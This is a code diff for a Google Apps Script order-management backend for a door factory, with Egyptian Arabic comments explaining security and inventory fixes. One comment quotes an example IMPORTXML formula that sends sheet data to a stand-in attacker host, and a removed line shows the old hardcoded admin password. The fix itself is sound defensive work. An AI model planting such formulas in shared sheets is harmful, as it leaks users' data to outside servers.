@@ -12,7 +12,7 @@
  *  التبويبات بتتعمل لوحدها أول ما يوصل أول طلب — مش محتاج تعملها بإيدك.
  *
  *  عمود Status في تبويب Orders بيتحدّد من شاشة «🔒 المصنع» جوه التطبيق
- *  (كلمة السر ADMIN_PW تحت). القيم:
+ *  (كلمة السر بتتظبط من Script Properties باسم ADMIN_PW — شوف adminPw_ تحت). القيم:
  *      New          → طلب جديد
  *      Received     → تم استلام الطلب
  *      In Progress  → تحت التنفيذ (دخل الإنتاج)
@@ -34,7 +34,27 @@ var SHEET_STOCK  = 'Stock';        // أرصدة المخزن الجاهزة ل�
 var HEAD_STOCK = ['Code', 'Size', 'Qty', 'Updated'];
 var TZ           = 'Africa/Cairo';
 var ROD_LEN      = 2.20;   // الطول الافتراضي — الطول الفعلي بيجي مع كل صنف في it.rodCm
-var ADMIN_PW     = '3184';
+// ⚠️⚠️ كلمة سر شاشة المصنع مابقتش مكتوبة في الكود.
+//
+// السبب: الملف ده متسجّل في مستودع GitHub عام على الإنترنت — يعني أي حد يفتح
+// الرابط كان يشوف كلمة السر مكتوبة صريحة. مافيش تعقيد في كلمة السر بيحمي من ده.
+//
+// دلوقتي بتتقري من Script Properties (إعدادات المشروع في Apps Script نفسه،
+// مش بتتحفظ في أي ملف ولا بتترفع على GitHub).
+//
+// إزاي تظبطها (مرة واحدة بس):
+//   ١) افتح محرر Apps Script بتاع المشروع
+//   ٢) من الشمال: ⚙️ Project Settings
+//   ٣) انزل لـ "Script Properties" → Add script property
+//   ٤) Property = ADMIN_PW   |   Value = كلمة السر اللي تختارها
+//   ٥) Save، وبعدين Deploy → New deployment
+//
+// لو ما ظبطتهاش، شاشة المصنع هترفض الدخول وهتقول لك تظبطها — بدل ما تشتغل
+// بكلمة سر معروفة للعالم كله.
+function adminPw_() {
+  var v = PropertiesService.getScriptProperties().getProperty('ADMIN_PW');
+  return v ? String(v) : '';
+}
 
 // ⚠️ أرقام أعمدة تبويب Orders (تبدأ من ١). لو زوّدت أو رتّبت الأعمدة
 // في HEAD_ORDERS تحت، لازم تظبّط الأرقام دي معاها.
@@ -78,10 +98,40 @@ var COL_ITEM_DOORHEIGHT = 20; // ارتفاع الضلفة (سم) — اختيا
 // بتمنع Formula Injection: أي نص حر من العميل (اسم/ملاحظة) بيتكتب في الشيت،
 // لو بيبدأ بـ = أو + أو - أو @ جوجل شيتس ممكن تفسّره كصيغة (formula) بدل نص عادي.
 // بنحط علامة اقتباس (') قبله عشان يتخزن كنص حرفي زي ما هو، بالظبط زي ما بيحصل بالفعل لرقم الموبايل تحت.
+// تنسيق تاريخ آمن. قبل كده كان الكود بينادي Utilities.formatDate(new Date(cell)) على طول،
+// فأي صف فيه خانة تاريخ فاضية أو مكتوبة غلط بالإيد كان بيرمي استثناء يوقّع الرد كله —
+// يعني شاشة المصنع وكل التقارير بتفضل فاضية بسبب صف واحد بايظ.
+function fmtDate_(v) {
+  try {
+    if (v === '' || v === null || v === undefined) return '';
+    var d = (v instanceof Date) ? v : new Date(v);
+    if (isNaN(d.getTime())) return '';
+    return Utilities.formatDate(d, TZ, 'yyyy-MM-dd');
+  } catch (err) { return ''; }
+}
+
 function sanitizeCell_(s) {
   s = String(s == null ? '' : s);
-  if (/^[=+\-@]/.test(s)) return "'" + s;
+  // بنضيف \t و\r كمان: جوجل شيت بيتجاهل المسافات في أول الخانة، فـ "\t=CMD" لسه
+  // بيتقري كصيغة. الشرط القديم كان بيفوّتها.
+  if (/^[\s]*[=+\-@\t\r]/.test(s)) return "'" + s;
   return s;
+}
+
+// ⚠️ ثغرة كانت هنا: تنظيف الصيغ (sanitizeCell_) كان متطبّق على 4 حقول بس
+// (الاسم، صاحب الأوردر، ملاحظات العميل، ملاحظة الصنف). باقي الحقول اللي الموزع
+// بيكتبها بإيده — «المنطقة»، ونص الرسالة، وتليفون صاحب الأوردر، واسم الصنف والكود
+// والمقاس — كانت بتتكتب في الشيت زي ما هي.
+// و endpoint الـ newOrder مفتوح من غير كلمة سر (لازم يفضل كده عشان الموزعين
+// يقدروا يبعتوا)، يعني أي حد يقدر يبعت طلب فيه صيغة زي:
+//     =IMPORTXML("https://evil.example/?d="&A1&B1, "//x")
+// وأول ما موظف المصنع يفتح الشيت، جوجل بينفّذ الصيغة ويسرّب بيانات الصفوف لسيرفر بره.
+// الحل: ننظّف الصف كله — كل خانة نصية بتعدّي على sanitizeCell_، والأرقام والتواريخ
+// بتفضل زي ما هي عشان الجمع والترتيب في الشيت ما يتكسرش.
+function sanitizeRow_(row) {
+  return row.map(function (v) {
+    return (typeof v === 'string') ? sanitizeCell_(v) : v;
+  });
 }
 
 // بيرجّع رقم الطلب "العادي" التسلسلي الجاي (1، 2، 3...) — بيتخزن في Script Properties وبيتزوّد بأمان.
@@ -100,26 +150,68 @@ function nextOrderDisplayNo_(sh) {
   return next;
 }
 
-function checkAdminPw_(pw) {
+// ⚠️ المشكلة اللي كانت في النسخة القديمة: العدّاد والقفل كانوا عامّين على السكريبت
+// كله. يعني أي حد يعمل ١٥ محاولة غلط كان بيقفل شاشة المصنع على الموظفين كلهم ١٥
+// دقيقة — هجمة تعطيل بسيطة جدًا وبتتكرر على طول.
+//
+// النظام الجديد بطبقتين:
+//   • طبقة الجهاز: ٥ محاولات غلط من نفس الجهاز → الجهاز ده يتقفل ١٥ دقيقة.
+//     المهاجم بيتقفل، والموظف على جهازه مش متأثر خالص.
+//   • طبقة عامة: مافيش قفل نهائي أبدًا — بس تأخير بيكبر مع عدد المحاولات الغلط
+//     (لحد ٨ ثواني). يعني التخمين بيبقى بطيء جدًا، والموظف اللي بيكتب كلمة السر
+//     الصح بيدخل على طول من غير ما يستنى.
+// النتيجة: التخمين أصعب من الأول، ومافيش طريقة تقفل الشاشة على المصنع.
+function checkAdminPw_(pw, devId) {
   var cache = CacheService.getScriptCache();
-  var failKey = 'adm_fail_count';
-  var lockKey = 'adm_locked_until';
+  var pwReal = adminPw_();
 
-  var lockedUntil = Number(cache.get(lockKey) || 0);
+  // كلمة السر مش متظبّطة في Script Properties — بلّغ بوضوح بدل ما تقبل أي حاجة
+  if (!pwReal) return false;
+
+  var dev = String(devId || '').replace(/[^A-Za-z0-9_-]/g, '').slice(0, 40) || 'nodev';
+  var devFailKey = 'adm_f_' + dev;
+  var devLockKey = 'adm_l_' + dev;
+  var globFailKey = 'adm_fail_count';
+
+  // الجهاز ده مقفول؟
+  var lockedUntil = Number(cache.get(devLockKey) || 0);
   if (lockedUntil && Date.now() < lockedUntil) return false;
 
-  if (String(pw || '') === ADMIN_PW) {
-    cache.remove(failKey);
+  if (String(pw || '') === pwReal) {
+    cache.remove(devFailKey);
+    cache.remove(devLockKey);
     return true;
   }
 
-  var fails = Number(cache.get(failKey) || 0) + 1;
-  cache.put(failKey, String(fails), 600); // نافذة ١٠ دقايق
-  if (fails >= 15) {
-    cache.put(lockKey, String(Date.now() + 15 * 60000), 1200); // قفل ١٥ دقيقة
+  // فشل: زوّد العدّادين
+  var devFails = Number(cache.get(devFailKey) || 0) + 1;
+  cache.put(devFailKey, String(devFails), 900);              // نافذة ١٥ دقيقة للجهاز
+  if (devFails >= 5) {
+    cache.put(devLockKey, String(Date.now() + 15 * 60000), 1200);   // اقفل الجهاز ده بس
   }
-  Utilities.sleep(Math.min(fails * 300, 4000)); // تأخير متزايد لحد ٤ ثواني
+
+  var globFails = Number(cache.get(globFailKey) || 0) + 1;
+  cache.put(globFailKey, String(globFails), 600);            // نافذة ١٠ دقايق عامة
+  // تأخير عام بيكبر مع المحاولات — بيبطّأ التخمين من غير ما يقفل على حد
+  Utilities.sleep(Math.min(globFails * 400, 8000));
   return false;
+}
+
+// مقارنة صامتة بكلمة السر — من غير عدّادات ولا تأخير.
+// بتتستخدم بس في المسارات اللي المستخدم العادي بيعدي منها كمان (زي «تابع طلبك»
+// وإلغاء الطلب برقم الموبايل)، عشان مانعاقبش الموزع العادي بتأخير 8 ثواني
+// وإحنا أصلًا مش بنطلب منه كلمة سر. لو مفيش كلمة سر مبعوتة بترجّع false على طول.
+function isAdminPwQuiet_(pw) {
+  var real = adminPw_();
+  return !!(real && String(pw || '') === real);
+}
+
+// بيرجّع رسالة الخطأ المناسبة لشاشة المصنع
+function adminPwError_() {
+  if (!adminPw_()) {
+    return 'كلمة سر المصنع مش متظبّطة على السيرفر — افتح Apps Script → Project Settings → Script Properties وضيف ADMIN_PW';
+  }
+  return 'كلمة السر غلط';
 }
 
 /* ============================================================
@@ -180,8 +272,8 @@ function doGet(e) {
 
     // تحديث حالة الطلب — من شاشة المصنع
     if (action === 'setStatus') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lock = LockService.getScriptLock();
       try {
@@ -205,8 +297,8 @@ function doGet(e) {
 
     // أرشفة/إرجاع طلب يدويًا (📦 أرشفة أو ↩️ رجّع من الأرشيف)
     if (action === 'archiveOrder') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockAR = LockService.getScriptLock();
       try {
@@ -225,10 +317,10 @@ function doGet(e) {
       var isAdmin;
       if (e.parameter.phone) {
         // مستخدم عادي بيجيب طلباته هو برقم موبايله — مفيش داعي لأي تحقق باسورد أو تقييد محاولات
-        isAdmin = String(e.parameter.pw || '') === ADMIN_PW;
+        isAdmin = isAdminPwQuiet_(e.parameter.pw);
       } else {
         // مفيش رقم موبايل = محاولة دخول شاشة المصنع؛ لازم تعدي بوابة الحماية من التخمين
-        if (!checkAdminPw_(e.parameter.pw)) return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+        if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) return reply({ ok: false, error: adminPwError_() }, cb);
         isAdmin = true;
       }
       var phone = isAdmin ? '' : String((e.parameter.phone || '')).replace(/\D/g, '');
@@ -256,7 +348,7 @@ function doGet(e) {
 
         out.push({
           id:     rows[i][0],
-          date:   Utilities.formatDate(new Date(rows[i][1]), TZ, 'yyyy-MM-dd'),
+          date:   fmtDate_(rows[i][1]),
           dist:   rows[i][3],
           phone:  isAdmin ? String(rows[i][4] || '').replace(/^'/, '') : '',
           region: rows[i][5],
@@ -279,8 +371,8 @@ function doGet(e) {
 
     // قايمة أصناف طلب واحد بالتفصيل — لشاشة المصنع بس (لعرض/تعديل التوفر ولتصدير PDF)
     if (action === 'orderItems') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var shOI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
       var idOI = String(e.parameter.id || '');
@@ -319,8 +411,8 @@ function doGet(e) {
 
     // تحديد صنف معيّن جوه طلب كـ"غير متاح" أو رجّعه "متاح" — بالـ idx (ترتيبه جوه الطلب، يبدأ من صفر)
     if (action === 'setItemAvail') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockIA = LockService.getScriptLock();
       try {
@@ -351,8 +443,8 @@ function doGet(e) {
     // بيحدّث سطر الصنف (الكمية + الإجمالي) وبعدين بيعيد حساب إجماليات الطلب كله (كمية/عيدان/مبلغ)
     // تعديل بيانات الطلب الأساسية (اسم صاحب الأوردر / التاريخ) — يدوي من شاشة المصنع، من غير ما تفتح "طلب جديد"
     if (action === 'setOrderMeta') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockOM = LockService.getScriptLock();
       try {
@@ -369,15 +461,15 @@ function doGet(e) {
         }
         return reply({ ok: true, id: e.parameter.id,
           customer: shOM.getRange(rOM, COL_CUSTOMER).getValue(),
-          date: Utilities.formatDate(new Date(shOM.getRange(rOM, 2).getValue()), TZ, 'yyyy-MM-dd') }, cb);
+          date: fmtDate_(shOM.getRange(rOM, 2).getValue()) }, cb);
       } finally {
         try { lockOM.releaseLock(); } catch (eOM) {}
       }
     }
 
     if (action === 'setItemQty') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockIQ = LockService.getScriptLock();
       try {
@@ -401,6 +493,18 @@ function doGet(e) {
         var unitPriceIQ = Number(shIQ.getRange(foundIQ, 12).getValue()) || 0;   // عمود Unit Price
         var producedIQ = Number(shIQ.getRange(foundIQ, COL_ITEM_PRODUCED).getValue()) || 0;
         if (producedIQ > newQtyIQ) producedIQ = newQtyIQ;   // ميفضلش "جاهز" أكبر من "مطلوب" بعد التعديل
+
+        // ⚠️ باج كان هنا: الكمية بتتغيّر والرصيد ما بيتعدّلش خالص. يعني لو المصنع
+        // عدّل صنف من 5 أبواب لـ 2، التلاتة الباقيين بيفضلوا مخصومين من المخزن
+        // للأبد (الرصيد يبان أقل من الحقيقة). والعكس لو زوّد الكمية.
+        // بنعدّل الرصيد بالفرق: القديم ناقص الجديد.
+        var stkIQ = stockItemFromRow_(shIQ, foundIQ);
+        if (stkIQ && orderStatus_(idIQ) !== 'Delivered') {
+          var diffIQ = stkIQ.qty - newQtyIQ;          // موجب = نرجّع للمخزن، سالب = نخصم زيادة
+          if (diffIQ) adjustStockForItems_([{ kind:'door', code:stkIQ.code, w:stkIQ.w, qty:Math.abs(diffIQ) }],
+                                           diffIQ > 0 ? +1 : -1);
+        }
+
         shIQ.getRange(foundIQ, 11).setValue(newQtyIQ);                    // Qty
         shIQ.getRange(foundIQ, 13).setValue(unitPriceIQ * newQtyIQ);      // Line Total
         shIQ.getRange(foundIQ, COL_ITEM_PRODUCED).setValue(producedIQ);
@@ -413,8 +517,8 @@ function doGet(e) {
 
     // حذف صنف واحد بس من طلب (يدوي من شاشة المصنع) وإعادة حساب إجماليات الطلب
     if (action === 'deleteOrderItem') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockDI = LockService.getScriptLock();
       try {
@@ -433,6 +537,13 @@ function doGet(e) {
           }
         }
         if (foundDI < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
+
+        // ⚠️ باج كان هنا: الصنف بيتحذف والرصيد ما بيرجعش. يعني حذف صنف فيه 5 أبواب
+        // كان بيسيبهم مخصومين من المخزن للأبد. بنرجّعهم قبل ما نمسح الصف.
+        // (زي حذف الطلب كله بالظبط — المُسلَّم فعليًا ميترجّعش رصيده)
+        var stkDI = stockItemFromRow_(shDI, foundDI);
+        if (stkDI && orderStatus_(idDI) !== 'Delivered') adjustStockForItems_([stkDI], +1);
+
         shDI.deleteRow(foundDI);
         var totalsDI = recomputeOrderTotals_(idDI);
         return reply({ ok: true, totals: totalsDI }, cb);
@@ -442,8 +553,8 @@ function doGet(e) {
     }
 
     if (action === 'setItemProduced') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockIP = LockService.getScriptLock();
       try {
@@ -483,7 +594,7 @@ function doGet(e) {
         var rCO = findRow_(shCO, e.parameter.id);
         if (rCO < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
 
-        var isAdminCO = String(e.parameter.pw || '') === ADMIN_PW;
+        var isAdminCO = isAdminPwQuiet_(e.parameter.pw);   // المستخدم العادي بيلغي طلبه برقم موبايله، مش بكلمة سر
         if (!isAdminCO) {
           var ownerPhoneCO = String(shCO.getRange(rCO, 5).getValue() || '').replace(/^'/, '').replace(/\D/g, '');
           var reqPhoneCO = String(e.parameter.phone || '').replace(/\D/g, '');
@@ -516,8 +627,8 @@ function doGet(e) {
 
     // حذف طلب بالكامل (السطر الملخّص + كل سطور أصنافه) — من شاشة المصنع
     if (action === 'deleteOrder') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockDO = LockService.getScriptLock();
       try {
@@ -538,8 +649,8 @@ function doGet(e) {
 
     // مسح كل الطلبات اللي حالتها "تم التسليم" دفعة واحدة (تنظيف دوري) — من زرار "🗑️ مسح المسلّم"
     if (action === 'deleteDelivered') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockDD = LockService.getScriptLock();
       try {
@@ -567,8 +678,8 @@ function doGet(e) {
 
     // كل الطلبات + أصنافها مرة واحدة — لتقرير الـ PDF الشامل في شاشة المصنع (بدل ما نجيب كل طلب لوحده)
     if (action === 'listWithItems') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var shLW = sheet_(SHEET_ORDERS, HEAD_ORDERS);
       var rowsLW = shLW.getDataRange().getValues();
@@ -608,7 +719,7 @@ function doGet(e) {
         var idLW = String(rowsLW[jLW][0]);
         outLW.push({
           id:        idLW,
-          date:      Utilities.formatDate(new Date(rowsLW[jLW][1]), TZ, 'yyyy-MM-dd'),
+          date:      fmtDate_(rowsLW[jLW][1]),
           dist:      rowsLW[jLW][3],
           phone:     String(rowsLW[jLW][4] || '').replace(/^'/, ''),
           region:    rowsLW[jLW][5],
@@ -648,8 +759,8 @@ function doGet(e) {
 
     // تحديث رصيد صنف واحد (كود + مقاس) — من شاشة المصنع بكلمة السر
     if (action === 'setStock') {
-      if (!checkAdminPw_(e.parameter.pw)) {
-        return reply({ ok: false, error: 'كلمة السر غلط' }, cb);
+      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
+        return reply({ ok: false, error: adminPwError_() }, cb);
       }
       var lockSS = LockService.getScriptLock();
       try {
@@ -733,6 +844,8 @@ function saveOrder_(o) {
     o.customerPhone || ''  // تليفون صاحب الأوردر لو مختلف عن صاحب الجهاز
   ];
 
+  rowO = sanitizeRow_(rowO);   // كل خانة نصية تتنظّف من الصيغ قبل ما تدخل الشيت
+
   if (existing > 0) {
     // بنحافظ على الحالة والملاحظة اللي المصنع كتبها، ونحدّث الباقي بس
     var keep = shO.getRange(existing, COL_STATUS, 1, 2).getValues()[0];
@@ -812,7 +925,8 @@ function saveOrder_(o) {
   }
 
   if (lines.length) {
-    shI.getRange(shI.getLastRow() + 1, 1, lines.length, HEAD_ITEMS.length).setValues(lines);
+    shI.getRange(shI.getLastRow() + 1, 1, lines.length, HEAD_ITEMS.length)
+       .setValues(lines.map(sanitizeRow_));   // نفس التنظيف على كل سطر صنف
   }
 
   // ---- خصم الرصيد ----
@@ -853,6 +967,25 @@ function recomputeOrderTotals_(id) {
   return { qty: qty, rods: rods, total: total };
 }
 
+// بيرجّع حالة الطلب من شيت Orders (نص فاضي لو مش موجود)
+function orderStatus_(id){
+  var sh = sheet_(SHEET_ORDERS, HEAD_ORDERS);
+  var r = findRow_(sh, id);
+  if (r < 0) return '';
+  return String(sh.getRange(r, COL_STATUS).getValue() || '');
+}
+
+// بيقرا بيانات المخزون بتاعة صف صنف واحد (كود/عرض/كمية) — بيرجّع null لو مش باب
+// أو مش متتبّع في المخزون (مقاس خاص/بدون كود).
+function stockItemFromRow_(sh, row){
+  var vals = sh.getRange(row, 1, 1, HEAD_ITEMS.length).getValues()[0];
+  if (String(vals[3]) !== 'Door') return null;
+  var code = String(vals[5] || '').trim();
+  var w    = String(vals[COL_ITEM_WIDTH - 1] || '').trim();
+  if (!code || !w) return null;
+  return { kind: 'door', code: code, w: w, qty: Number(vals[10]) || 0 };
+}
+
 function restoreStockForOrderId_(id){
   var shRS = sheet_(SHEET_ITEMS, HEAD_ITEMS);
   var lastRS = shRS.getLastRow();
@@ -874,28 +1007,55 @@ function restoreStockForOrderId_(id){
 
 // بيزوّد أو بيخصم من رصيد المخزون حسب أصناف الطلب (الأبواب اللي ليها مقاس قياسي بس — مقاس خاص مش متتبّع)
 // dir: -1 للخصم (طلب جديد) أو +1 للرجوع (إلغاء/حذف طلب)
+// ⚠️ كان فيه باجين هنا:
+//
+// ١) خصم ضايع لو الطلب فيه سطرين بنفس الكود والمقاس (وده بيحصل عادي — مثلاً باب
+//    A01 مقاس 70 عادي + نفس الباب والمقاس نسخة حفر، أو الموزع ضاف نفس المقاس
+//    مرتين). الكود كان بيقرا الأرصدة مرة واحدة في rowsAS قبل اللوب، وبعدين لكل
+//    صنف يحسب "الرصيد القديم - الكمية" ويكتبه. فالسطر التاني كان بيقرا نفس الرصيد
+//    القديم من الذاكرة (مش المحدَّث) ويكتب فوق خصم السطر الأول فيلغيه.
+//    مثال حقيقي: رصيد 10، طلب فيه 3 + 2 → المفروض يبقى 5، وكان بيطلع 8.
+//    الحل: نجمّع كل الكميات لكل (كود|مقاس) الأول، وبعدين نخصم مرة واحدة.
+//
+// ٢) بطء: كان بيعمل setValue مرتين لكل صنف جوه لوب — كل واحدة نداء منفصل لـ Sheets.
+//    طلب فيه 10 أصناف = 20 نداء (ثواني بتتضاف على كل إرسال طلب). دلوقتي كتابة
+//    واحدة مجمّعة على المدى كله.
 function adjustStockForItems_(items, dir){
   if (!items || !items.length) return;
   var shAS = sheet_(SHEET_STOCK, HEAD_STOCK);
   var lastAS = shAS.getLastRow();
   if (lastAS < 2) return;   // مفيش أرصدة متسجّلة أصلًا
-  var rowsAS = shAS.getRange(2, 1, lastAS - 1, 3).getValues();
+
+  // ١) نجمّع المطلوب خصمه/رجوعه لكل (كود|مقاس)
+  var deltas = {};
   for (var iAS = 0; iAS < items.length; iAS++) {
     var itAS = items[iAS];
     if (itAS.kind !== 'door') continue;
     var codeAS = String(itAS.code || '').trim();
-    var wAS = String(itAS.w || '').trim();
-    var qtyAS = Number(itAS.qty) || 0;
+    var wAS    = String(itAS.w || '').trim();
+    var qtyAS  = Number(itAS.qty) || 0;
     if (!codeAS || !wAS || !qtyAS) continue;   // مقاس خاص أو بدون كود = مش متتبّع في المخزون
-    for (var jAS = 0; jAS < rowsAS.length; jAS++) {
-      if (String(rowsAS[jAS][0]).trim() === codeAS && String(rowsAS[jAS][1]).trim() === wAS) {
-        var newQty = (Number(rowsAS[jAS][2]) || 0) + (dir * qtyAS);
-        shAS.getRange(jAS + 2, 3).setValue(newQty);
-        shAS.getRange(jAS + 2, 4).setValue(new Date());
-        break;   // صف الرصيد ده متسجّل، اتحدّث — لو مش موجود أصلًا، متتبّعش (مش هننشئ صف جديد من غير ما يكون معروف)
-      }
-    }
+    var keyAS = codeAS + '|' + wAS;
+    deltas[keyAS] = (deltas[keyAS] || 0) + (dir * qtyAS);
   }
+  var keys = Object.keys(deltas);
+  if (!keys.length) return;
+
+  // ٢) نطبّقهم على نسخة واحدة من الأرصدة
+  var rng    = shAS.getRange(2, 1, lastAS - 1, 4);
+  var rowsAS = rng.getValues();
+  var now = new Date();
+  var touched = false;
+  for (var jAS = 0; jAS < rowsAS.length; jAS++) {
+    var k = String(rowsAS[jAS][0]).trim() + '|' + String(rowsAS[jAS][1]).trim();
+    if (!(k in deltas)) continue;              // الصف ده مش متتبّع في الطلب
+    rowsAS[jAS][2] = (Number(rowsAS[jAS][2]) || 0) + deltas[k];
+    rowsAS[jAS][3] = now;
+    touched = true;
+  }
+
+  // ٣) كتابة واحدة بدل نداءين لكل صنف
+  if (touched) rng.setValues(rowsAS);
 }
 
 /* ============================================================
